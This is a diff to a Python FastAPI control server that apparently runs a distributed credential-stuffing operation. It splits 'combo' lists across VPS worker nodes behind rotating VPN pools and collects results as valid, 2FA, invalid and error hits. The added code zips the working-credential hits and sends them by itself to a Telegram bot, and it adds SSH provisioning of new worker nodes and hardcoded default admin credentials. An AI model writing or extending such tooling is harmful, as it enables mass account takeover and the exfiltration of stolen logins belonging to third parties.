@@ -7,10 +7,13 @@ import base64
 import binascii
 import contextlib
 import hmac
+import io
 import os
 import re
 import secrets
 import time
+import urllib.request
+import zipfile
 from collections import defaultdict, deque
 from contextlib import asynccontextmanager
 
@@ -145,7 +148,9 @@ class JobDispatchBody(BaseModel):
     combo_text: str = ""
     per_vps_combos: dict[str, str] = Field(default_factory=dict)
     args: list[str] = Field(default_factory=list)
-    workers: int = 0  # 0 = auto per-VPS benchmarked default_workers
+    workers: int | str = "auto"  # "auto" (or 0) | 1..30
+    two_tab: bool | None = None
+    filename: str = ""
     distribute_vpn: bool = False
     vpn_folders: list[str] = Field(default_factory=list)
 
@@ -168,6 +173,7 @@ class ProvisionBody(BaseModel):
 
 _BOOL_CHECKER_FLAGS = {
     "--two-tab",
+    "--no-two-tab",
     "--skip-ovpn-test",
     "--retest-ovpn",
     "--no-vpn-ip-check",
@@ -272,6 +278,80 @@ def _bearer_token(auth_header: str | None) -> str:
     return ""
 
 
+_OUTPUT_RESULT_FILES = ("hit_valid.txt", "hit_2fa.txt", "invalid.txt", "err.txt")
+
+
+_MAX_ZIP_UPLOAD_BYTES = 25 * 1024 * 1024
+_MAX_ZIP_ENTRY_BYTES = 50 * 1024 * 1024
+_MAX_ZIP_TOTAL_UNCOMPRESSED = 100 * 1024 * 1024
+
+
+def _validate_and_read_output_zip(raw: bytes) -> dict[str, list[str]]:
+    if len(raw) > _MAX_ZIP_UPLOAD_BYTES:
+        raise ValueError(f"Output zip too large (>{_MAX_ZIP_UPLOAD_BYTES} bytes)")
+    parsed: dict[str, list[str]] = {}
+    total_uncompressed = 0
+    with zipfile.ZipFile(io.BytesIO(raw), "r") as zf:
+        for info in zf.infolist():
+            b = os.path.basename(info.filename)
+            if info.filename != b or b not in _OUTPUT_RESULT_FILES:
+                raise ValueError(f"Disallowed entry in output zip: {info.filename}")
+            if info.file_size > _MAX_ZIP_ENTRY_BYTES:
+                raise ValueError(f"Zip entry too large: {info.filename}")
+            total_uncompressed += info.file_size
+            if total_uncompressed > _MAX_ZIP_TOTAL_UNCOMPRESSED:
+                raise ValueError("Zip uncompressed payload too large")
+        total_read = 0
+        for info in zf.infolist():
+            chunks: list[bytes] = []
+            read_so_far = 0
+            with zf.open(info, "r") as zmember:
+                while True:
+                    blk = zmember.read(65536)
+                    if not blk:
+                        break
+                    read_so_far += len(blk)
+                    total_read += len(blk)
+                    if read_so_far > _MAX_ZIP_ENTRY_BYTES or total_read > _MAX_ZIP_TOTAL_UNCOMPRESSED:
+                        raise ValueError(f"Zip bomb detected in {info.filename}")
+                    chunks.append(blk)
+            lines = [ln.strip() for ln in b"".join(chunks).decode("utf-8", errors="ignore").splitlines() if ln.strip()]
+            parsed[info.filename] = lines
+    return parsed
+
+
+def _send_telegram_zip_sync(
+    tg_token: str, tg_chat_id: str, filename: str, zip_bytes: bytes, caption: str
+) -> dict:
+    boundary = f"----ufpBoundary{secrets.token_hex(8)}"
+    parts: list[bytes] = []
+    for k, v in (("chat_id", tg_chat_id), ("caption", caption)):
+        parts.append(
+            f"--{boundary}\r\nContent-Disposition: form-data; name=\"{k}\"\r\n\r\n{v}\r\n".encode("utf-8")
+        )
+    parts.append(
+        (
+            f"--{boundary}\r\n"
+            f'Content-Disposition: form-data; name="document"; filename="{filename}"\r\n'
+            f"Content-Type: application/zip\r\n\r\n"
+        ).encode("utf-8")
+        + zip_bytes
+        + b"\r\n"
+    )
+    parts.append(f"--{boundary}--\r\n".encode("utf-8"))
+    body = b"".join(parts)
+    req = urllib.request.Request(
+        f"https://api.telegram.org/bot{tg_token}/sendDocument",
+        data=body,
+        headers={"Content-Type": f"multipart/form-data; boundary={boundary}"},
+        method="POST",
+    )
+    with urllib.request.urlopen(req, timeout=25.0) as resp:
+        import json as _json
+
+        return _json.loads(resp.read().decode("utf-8", "replace"))
+
+
 def create_app(
     db_path: str | None = None,
     api_key: str | None = None,
@@ -279,6 +359,8 @@ def create_app(
     repo_dir: str | None = None,
     username: str | None = None,
     password: str | None = None,
+    tg_token: str | None = None,
+    tg_chat_id: str | None = None,
 ) -> FastAPI:
     base_data = os.path.abspath(data_dir or os.environ.get("INDUK_DATA_DIR", "induk_data"))
     resolved_db = db_path or os.environ.get("INDUK_DB_PATH") or os.path.join(base_data, "induk.db")
@@ -286,6 +368,16 @@ def create_app(
     resolved_user = username if username is not None else (os.environ.get("INDUK_USER") or "lilvoda")
     resolved_pass = password if password is not None else (os.environ.get("INDUK_PASS") or "adminvoda@")
     resolved_key = api_key if api_key is not None else os.environ.get("INDUK_API_KEY", "")
+    resolved_tg_tok = (
+        tg_token
+        if tg_token is not None
+        else (os.environ.get("INDUK_TG_TOKEN") or os.environ.get("UFASPROXY_TG_TOKEN") or "")
+    ).strip()
+    resolved_tg_chat = (
+        tg_chat_id
+        if tg_chat_id is not None
+        else (os.environ.get("INDUK_TG_CHAT_ID") or os.environ.get("UFASPROXY_TG_CHAT_ID") or "")
+    ).strip()
     offline_s = float(os.environ.get("INDUK_OFFLINE_S", "20.0"))
     stall_s = float(os.environ.get("INDUK_STALL_S", "180.0"))
 
@@ -296,6 +388,18 @@ def create_app(
     ws_tickets: dict[str, float] = {}
     ui_sessions: dict[str, float] = {}
     ssh_tasks: set[asyncio.Task[None]] = set()
+    job_locks: dict[str, asyncio.Lock] = {}
+
+    def _get_job_lock(jid: str) -> asyncio.Lock:
+        lk = job_locks.get(jid)
+        if lk is None:
+            if len(job_locks) >= 256:
+                for k in list(job_locks.keys())[:128]:
+                    if not job_locks[k].locked():
+                        job_locks.pop(k, None)
+            lk = asyncio.Lock()
+            job_locks[jid] = lk
+        return lk
 
     @asynccontextmanager
     async def lifespan(app: FastAPI):
@@ -476,6 +580,132 @@ def create_app(
         queued = [await _push_command_to_node(vid, ctype, body.payload) for vid in body.vps_ids]
         return {"ok": True, "queued": queued}
 
+    @app.get("/api/v1/jobs", dependencies=[Depends(require_ui_auth)])
+    async def list_jobs():
+        jobs = await db.list_jobs()
+
+        def _annotate() -> None:
+            for j in jobs:
+                jdir = os.path.join(base_data, "jobs", j["job_id"])
+                odir = os.path.join(jdir, "outputs")
+                j["outputs_count"] = len(os.listdir(odir)) if os.path.isdir(odir) else 0
+                j["tg_sent"] = os.path.isfile(os.path.join(jdir, ".tg_sent"))
+
+        await asyncio.to_thread(_annotate)
+        return {"jobs": jobs, "tg_configured": bool(resolved_tg_tok and resolved_tg_chat)}
+
+    async def _build_job_zip(job_id: str) -> tuple[str, bytes, dict]:
+        job = await db.get_job(job_id)
+        if not job:
+            raise HTTPException(status_code=404, detail=f"Job not found: {job_id}")
+        valid_rows = await db.export_hits(job_id, hit_type="VALID", dedup="per_job")
+        otp_rows = await db.export_hits(job_id, hit_type="OTP", dedup="per_job")
+
+        def _assemble() -> tuple[str, bytes, dict]:
+            merged: dict[str, list[str]] = {fn: [] for fn in _OUTPUT_RESULT_FILES}
+            seen_valid: set[str] = set()
+            seen_otp: set[str] = set()
+            for row in valid_rows:
+                ln = row["raw_line"].strip()
+                if ln and ln not in seen_valid:
+                    seen_valid.add(ln)
+                    merged["hit_valid.txt"].append(ln)
+            for row in otp_rows:
+                ln = row["raw_line"].strip()
+                if ln and ln not in seen_otp:
+                    seen_otp.add(ln)
+                    merged["hit_2fa.txt"].append(ln)
+
+            out_dir = os.path.join(base_data, "jobs", job_id, "outputs")
+            if os.path.isdir(out_dir):
+                for fn in sorted(os.listdir(out_dir)):
+                    if not fn.endswith(".zip"):
+                        continue
+                    zpath = os.path.join(out_dir, fn)
+                    try:
+                        with open(zpath, "rb") as f:
+                            parsed = _validate_and_read_output_zip(f.read())
+                        for base_name, lines in parsed.items():
+                            for s in lines:
+                                if base_name == "hit_valid.txt":
+                                    if s in seen_valid:
+                                        continue
+                                    seen_valid.add(s)
+                                elif base_name == "hit_2fa.txt":
+                                    if s in seen_otp:
+                                        continue
+                                    seen_otp.add(s)
+                                merged[base_name].append(s)
+                    except Exception:
+                        continue
+
+            cfg = job.get("config") or {}
+            stem = re.sub(r"[^A-Za-z0-9._-]+", "_", str(cfg.get("filename") or "").strip()).strip("._-")
+            zip_name = f"{stem}_{job_id}.zip" if stem else f"{job_id}.zip"
+            counts = {fn: len(lines) for fn, lines in merged.items()}
+            summary_txt = "\n".join(
+                [
+                    f"Job ID   : {job_id}",
+                    f"Input    : {stem or '-'}",
+                    f"VPS      : {', '.join(cfg.get('vps_ids') or []) or '-'}",
+                    f"Valid    : {counts['hit_valid.txt']}",
+                    f"2FA/OTP  : {counts['hit_2fa.txt']}",
+                    f"Invalid  : {counts['invalid.txt']}",
+                    f"Error    : {counts['err.txt']}",
+                ]
+            ) + "\n"
+            buf = io.BytesIO()
+            with zipfile.ZipFile(buf, "w", compression=zipfile.ZIP_DEFLATED) as zf:
+                zf.writestr("summary.txt", summary_txt.encode("utf-8"))
+                for fn in _OUTPUT_RESULT_FILES:
+                    if merged[fn]:
+                        zf.writestr(fn, ("\n".join(merged[fn]) + "\n").encode("utf-8"))
+            return zip_name, buf.getvalue(), counts
+
+        return await asyncio.to_thread(_assemble)
+
+    async def _dispatch_job_tg_zip(job_id: str) -> dict:
+        if not (resolved_tg_tok and resolved_tg_chat):
+            raise HTTPException(status_code=400, detail="Telegram token/chat_id belum dikonfigurasi")
+        zip_name, zbytes, counts = await _build_job_zip(job_id)
+        caption = (
+            f"📦 Output {zip_name}\n"
+            f"VALID: {counts['hit_valid.txt']} | 2FA: {counts['hit_2fa.txt']} | "
+            f"INVALID: {counts['invalid.txt']} | ERR: {counts['err.txt']}"
+        )
+        res = await asyncio.to_thread(
+            _send_telegram_zip_sync, resolved_tg_tok, resolved_tg_chat, zip_name, zbytes, caption
+        )
+        ok = bool(res.get("ok") is True)
+        if not ok:
+            raise HTTPException(status_code=502, detail=f"Telegram API failed: {res}")
+
+        def _mark_sent() -> None:
+            jdir = os.path.join(base_data, "jobs", job_id)
+            os.makedirs(jdir, exist_ok=True)
+            with open(os.path.join(jdir, ".tg_sent"), "w", encoding="utf-8") as f:
+                f.write(str(time.time()))
+
+        await asyncio.to_thread(_mark_sent)
+        return {"ok": True, "zip_name": zip_name, "counts": counts}
+
+    @app.get("/api/v1/results/{job_id}/zip", dependencies=[Depends(require_ui_auth)])
+    async def download_results_zip(job_id: str):
+        jid = _validate_safe_id(job_id, "job_id")
+        async with _get_job_lock(jid):
+            zip_name, zbytes, _ = await _build_job_zip(jid)
+        return Response(
+            zbytes,
+            media_type="application/zip",
+            headers={"Content-Disposition": f'attachment; filename="{zip_name}"'},
+        )
+
+    @app.post("/api/v1/results/{job_id}/telegram", dependencies=[Depends(require_ui_auth)])
+    async def send_results_telegram(job_id: str):
+        jid = _validate_safe_id(job_id, "job_id")
+        async with _get_job_lock(jid):
+            return await _dispatch_job_tg_zip(jid)
+
     @app.get("/api/v1/results/{job_id}", dependencies=[Depends(require_ui_auth)])
     async def get_results(
         job_id: str,
@@ -505,6 +735,55 @@ def create_app(
         if inserted > 0:
             await hub.broadcast_ui({"type": "hits_added", "job_id": jid, "vps_id": vps_id, "hit_type": body.hit_type, "inserted": inserted})
         return {"ok": True, "inserted": inserted, "received": received}
+
+    @app.post("/api/v1/agent/output/{job_id}")
+    async def upload_agent_output(job_id: str, request: Request, vps_id: str = Depends(require_agent_auth)):
+        jid = _validate_safe_id(job_id, "job_id")
+        job = await db.get_job(jid)
+        if not job:
+            raise HTTPException(status_code=404, detail=f"Job not found: {jid}")
+        expected = set((job.get("config") or {}).get("vps_ids") or [])
+        if expected and vps_id not in expected:
+            raise HTTPException(status_code=403, detail="VPS not assigned to this job")
+
+        chunks: list[bytes] = []
+        total_rx = 0
+        async for chunk in request.stream():
+            total_rx += len(chunk)
+            if total_rx > _MAX_ZIP_UPLOAD_BYTES:
+                raise HTTPException(status_code=413, detail="Output zip too large")
+            chunks.append(chunk)
+        raw = b"".join(chunks)
+
+        try:
+            await asyncio.to_thread(_validate_and_read_output_zip, raw)
+        except ValueError as ve:
+            raise HTTPException(status_code=400, detail=str(ve))
+        except Exception as exc:
+            raise HTTPException(status_code=400, detail="Invalid output zip") from exc
+
+        async with _get_job_lock(jid):
+            def _save_and_check() -> tuple[set[str], bool]:
+                jdir = os.path.join(base_data, "jobs", jid)
+                odir = os.path.join(jdir, "outputs")
+                os.makedirs(odir, exist_ok=True)
+                with open(os.path.join(odir, f"{vps_id}.zip"), "wb") as f:
+                    f.write(raw)
+                done = {fn[:-4] for fn in os.listdir(odir) if fn.endswith(".zip")}
+                sent = os.path.isfile(os.path.join(jdir, ".tg_sent"))
+                return done, sent
+
+            done_vps, already_sent = await asyncio.to_thread(_save_and_check)
+            await db.touch_seen(vps_id)
+
+            tg_auto_sent = False
+            if expected and expected.issubset(done_vps) and resolved_tg_tok and resolved_tg_chat and not already_sent:
+                with contextlib.suppress(Exception):
+                    await _dispatch_job_tg_zip(jid)
+                    tg_auto_sent = True
+
+        await hub.broadcast_ui({"type": "job_output_ready", "job_id": jid, "vps_id": vps_id, "tg_sent": tg_auto_sent})
+        return {"ok": True, "job_id": jid, "tg_auto_sent": tg_auto_sent}
 
     @app.get("/api/v1/vpn/pool", dependencies=[Depends(require_ui_auth)])
     async def get_vpn_pool():
@@ -589,12 +868,32 @@ def create_app(
         if body.distribute_vpn:
             await _distribute_vpn_shards(body.vps_ids, body.vpn_folders, sync_now=False)
 
+        w_raw = str(body.workers or "auto").strip().lower()
+        if w_raw in ("0", "auto", ""):
+            w_val = "auto"
+        else:
+            if not w_raw.isdigit() or not (1 <= int(w_raw) <= 30):
+                raise HTTPException(status_code=400, detail="workers must be 'auto' or 1..30")
+            w_val = str(int(w_raw))
+        stem = re.sub(r"[^A-Za-z0-9._-]+", "_", os.path.splitext(body.filename or "")[0]).strip("._-")[:40]
         job_id = f"job_{int(time.time())}_{secrets.token_hex(3)}"
-        await db.create_job(job_id, body.mode, {"vps_ids": body.vps_ids, "args": validated_args, "workers": body.workers})
+        assigned_vps = [vid for vid in body.vps_ids if assignments.get(vid)]
+        await db.create_job(
+            job_id,
+            body.mode,
+            {
+                "vps_ids": assigned_vps,
+                "args": validated_args,
+                "workers": w_val,
+                "two_tab": body.two_tab,
+                "filename": stem,
+            },
+        )
         job_dir = os.path.join(base_data, "jobs", job_id)
         os.makedirs(job_dir, exist_ok=True)
         queued = []
         has_w_arg = any(a in ("--workers", "-w") or a.startswith(("--workers=", "-w=")) for a in validated_args)
+        has_tt_arg = any(a in ("--two-tab", "--no-two-tab") for a in validated_args)
         for vid in body.vps_ids:
             chunk = assignments.get(vid) or []
             if not chunk:
@@ -603,7 +902,9 @@ def create_app(
                 f.write("\n".join(chunk) + "\n")
             args_list = list(validated_args)
             if not has_w_arg:
-                args_list.extend(["--workers", str(body.workers) if body.workers > 0 else "auto"])
+                args_list.extend(["--workers", w_val])
+            if not has_tt_arg and body.two_tab is not None:
+                args_list.append("--two-tab" if body.two_tab else "--no-two-tab")
             cmd = await _push_command_to_node(
                 vid,
                 "START",
@@ -635,18 +936,37 @@ def create_app(
         raw_token = secrets.token_urlsafe(32)
         induk_url = (body.induk_url or str(request.base_url)).rstrip("/")
         if body.mode == "bootstrap":
+            try:
+                script = render_bootstrap_script(
+                    induk_url, vid, raw_token, body.repo_url, body.pointer_url, body.ufasproxy_url, body.ufasproxy_token
+                )
+            except ValueError as ve:
+                raise HTTPException(status_code=400, detail=str(ve))
             await db.register_node(vid, body.name.strip() or vid, 4, raw_token)
-            script = render_bootstrap_script(
-                induk_url, vid, raw_token, body.repo_url, body.pointer_url, body.ufasproxy_url, body.ufasproxy_token
-            )
             return {"ok": True, "vps_id": vid, "agent_token": raw_token, "bootstrap_script": script}
 
         async def _run_ssh_task() -> None:
+            pre_created = [False]
+            succeeded = [False]
+
             async def _emit(line: str) -> None:
                 await hub.broadcast_ui({"type": "provision_log", "vps_id": vid, "line": line})
 
+            async def _pre_register(os_tag: str, bench: dict) -> None:
+                nodes_now, _ = await db.list_nodes(offline_after_s=offline_s, stall_after_s=stall_s)
+                if not any(n["vps_id"] == vid for n in nodes_now):
+                    pre_created[0] = True
+                await db.register_node(
+                    vid,
+                    body.name.strip() or vid,
+                    bench["recommended_workers"],
+                    raw_token,
+                    os_info=os_tag,
+                    benchmark=bench,
+                )
+
             try:
-                res = await provision_via_ssh(
+                await provision_via_ssh(
                     host=body.host.strip(),
                     port=body.port,
                     username=body.username.strip() or "root",
@@ -660,24 +980,24 @@ def create_app(
                     ufasproxy_url=body.ufasproxy_url,
                     ufasproxy_token=body.ufasproxy_token,
                     on_log=_emit,
+                    on_ready=_pre_register,
                 )
-                await db.register_node(
-                    vid,
-                    body.name.strip() or vid,
-                    res["benchmark"]["recommended_workers"],
-                    raw_token,
-                    os_info=res["os_info"],
-                    benchmark=res["benchmark"],
-                )
+                succeeded[0] = True
                 nodes, summary = await db.list_nodes(offline_after_s=offline_s, stall_after_s=stall_s)
                 await hub.broadcast_ui({"type": "snapshot", "nodes": nodes, "summary": summary})
-                await _emit(f"[{vid}] Ready (auto-bench={res['benchmark']['recommended_workers']} workers)")
+                await _emit(f"[{vid}] Ready")
             except UnsupportedOSError as oe:
                 await _emit(f"[{vid}] ERROR: {oe}")
             except asyncio.CancelledError:
                 raise
             except Exception as exc:
                 await _emit(f"[{vid}] ERROR: {exc}")
+            finally:
+                if not succeeded[0] and pre_created[0]:
+                    with contextlib.suppress(Exception):
+                        await db.delete_node(vid)
+                        nodes, summary = await db.list_nodes(offline_after_s=offline_s, stall_after_s=stall_s)
+                        await hub.broadcast_ui({"type": "snapshot", "nodes": nodes, "summary": summary})
 
         task = asyncio.create_task(_run_ssh_task())
         ssh_tasks.add(task)
